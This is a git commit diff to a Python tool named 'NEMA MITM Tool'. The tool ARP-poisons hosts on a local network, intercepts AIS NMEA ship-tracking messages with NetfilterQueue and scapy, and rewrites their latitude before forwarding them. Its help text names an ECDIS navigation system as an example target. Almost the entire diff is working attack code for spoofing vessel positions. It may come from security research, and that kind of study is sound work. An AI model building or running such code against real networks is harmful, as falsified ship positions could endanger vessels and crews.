b6d4cfdcca9bc1851cfbe3e47df0bb422aa58880
iam-7 <rajaguru598@gmail.com>
2022-06-13 21:59:39 -0400

    added ais

--- mitm.py
+++ mitm.py
@@ -1,15 +1,25 @@
+import string
 from scapy.all import *
-#from scapy.fft import dst
 from netfilterqueue import NetfilterQueue
-import codecs
 import os
 import time
 import sys
 import argparse
-import pyais
+from pyais import *
 
-target_ip = "10.0.2.26"
-src_ip = "10.0.2.25"
+
+class AIS_NMEA:
+    def __init__(self, sentence):
+        self.description = "AIS NMEA sentance handler"
+        self.sentence = sentence
+        self.decoded_dict = decode(sentence).asdict()
+        self.ais_dict = decode(sentence).asdict()
+        self.modified_sentence = encode_dict(self.ais_dict)
+
+    def alter_field(self, field_name, field_value):
+        self.ais_dict[field_name] = field_value
+        self.modified_sentence = encode_dict(self.ais_dict, talker_id="AIVDM")
+
 
 class MITM:
     def __init__(self, target_ip,  src_ip, iface):
@@ -19,25 +29,37 @@ class MITM:
         self.src_mac = None
         self.target_mac = None
         self.nfqueue = NetfilterQueue()
+        self.pkt = None
+
+    #def payload_handle(self):
 
     def modify(self, packet):
         pkt = packet.get_payload()
-        
+
         pktIP = IP(pkt)
-        pktIP.show()
-        if pktIP.haslayer(UDP) and pktIP.getlayer(UDP).payload:
+        
+        #pktIP.show()
+        payload = pktIP.getlayer(UDP).payload.decode()
+        if pktIP.haslayer(UDP) and payload.startswith("!AIVDM") :
+            print(f"[*] Packet Intercepted with payload {payload}")
+            ais_data = AIS_NMEA(payload.encode())
+
+            print(f"[*] Decoded: {ais_data.decoded_dict}")
             old_len = len(pktIP[UDP].payload)
             pktIP[UDP].remove_payload()
-            pktIP[UDP].add_payload(b"modified")
+
+            ais_data.alter_field('lat', 48.475577)
+            pktIP[UDP].add_payload(ais_data.modified_sentence)
 
             new_len = len(pktIP[UDP].payload)
             pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
             del pktIP[IP].chksum
             del pktIP[UDP].chksum
             del pktIP[UDP].len
-            pktIP.show2()
-            packet.set_payload(bytes(pktIP))
-            
+            #pktIP.show2()
+            pkt = pktIP.__class__(bytes(pktIP))
+            packet.set_payload(pkt)
+
         packet.accept()
 
     def setup(self):
@@ -49,19 +71,22 @@ class MITM:
 
     def get_mac(self, ip):
         try:
-            resp = srp1(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip),timeout =2, iface=self.iface, inter=0.1)
-            
+            resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
+                        timeout=2, iface=self.iface, inter=0.1)
+
             return resp.hwsrc
-            
+
         except Exception as e:
             print(f"[!] Could not find MAC address for {ip}")
             print(f"[!] Exiting....")
-        
+
     def re_arp(self):
         try:
             print("[*] Restoring Targets MAC")
-            send(ARP(op = 2, pdst = self.target_ip, psrc = self.src_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = self.src_mac), count = 7)
-            send(ARP(op = 2, pdst = self.src_ip, psrc = self.target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = self.target_mac), count = 7)
+            send(ARP(op=2, pdst=self.target_ip, psrc=self.src_ip,
+                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.src_mac), count=7)
+            send(ARP(op=2, pdst=self.src_ip, psrc=self.target_ip,
+                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
         except Exception:
             print("[!] Error while restoring targets..")
             print("[!] Exiting.....")
@@ -69,8 +94,8 @@ class MITM:
     def arp_poison(self):
         try:
             print("[*] Starting ARP Poisoning")
-            send(ARP(op = 2, pdst = self.src_ip, psrc = self.target_ip, hwdst = self.src_mac))
-            send(ARP(op = 2, pdst = self.src_ip, psrc = self.target_ip, hwdst = self.src_mac))
+            send(ARP(op=2, pdst=self.src_ip, psrc=self.target_ip, hwdst=self.src_mac))
+            send(ARP(op=2, pdst=self.src_ip, psrc=self.target_ip, hwdst=self.src_mac))
         except Exception as e:
             print("[!] ARP Poisoning Failed...")
             print("[!] Exiting")
@@ -84,12 +109,13 @@ class MITM:
 
     def start_mitm(self):
         try:
-            
+
             self.src_mac = self.get_mac(self.src_ip)
             self.target_mac = self.get_mac(self.target_ip)
-            
+
             print(f"[*] Getting MAC address of {self.src_ip}: {self.src_mac}")
-            print(f"[*] Getting MAC address of {self.target_ip}: {self.target_mac}")
+            print(
+                f"[*] Getting MAC address of {self.target_ip}: {self.target_mac}")
 
             self.arp_poison()
             time.sleep(1.5)
@@ -105,25 +131,35 @@ class MITM:
 
 def get_input():
     parser = argparse.ArgumentParser(description="NEMA MITM Tool")
-    parser.add_argument("-t","--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
-    parser.add_argument("-s", "--source-ip", help="Source system IP address", required=True)
-    parser.add_argument("-i", "--interface", help="Interface name", required=True)
+    parser.add_argument(
+        "-t", "--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
+    parser.add_argument("-s", "--source-ip",
+                        help="Source system IP address", required=True)
+    parser.add_argument("-i", "--interface",
+                        help="Interface name", required=True)
 
     args = parser.parse_args()
     return args
 
+
 if __name__ == '__main__':
+    ais_nmea = AIS_NMEA(b"!AIVDM,1,1,,A,13HOI:0P0000VOHLCnHQKwvL05Ip,0*23")
+    print(ais_nmea.sentence)
+    print(ais_nmea.decoded_dict)
+    ais_nmea.alter_field('lat', 48.475577)
+    print(ais_nmea.modified_sentence)
+    print(ais_nmea.ais_dict)
 
-    args = get_input()
-    
-    mitm = MITM(args.target_ip, args.source_ip, args.interface)
-    mitm.setup()
-    mitm.start_mitm()
-    
-    try:
-        print ("[*] waiting for data")
-        mitm.nfqueue.run()
-    except KeyboardInterrupt:
-    	mitm.stop_mitm()
+    # args = get_input()
 
-    mitm.nfqueue.unbind()
+    # mitm = MITM(args.target_ip, args.source_ip, args.interface)
+    # mitm.setup()
+    # mitm.start_mitm()
+
+    # try:
+    #     print("[*] waiting for data")
+    #     mitm.nfqueue.run()
+    # except KeyboardInterrupt:
+    #     mitm.stop_mitm()
+
+    # mitm.nfqueue.unbind()
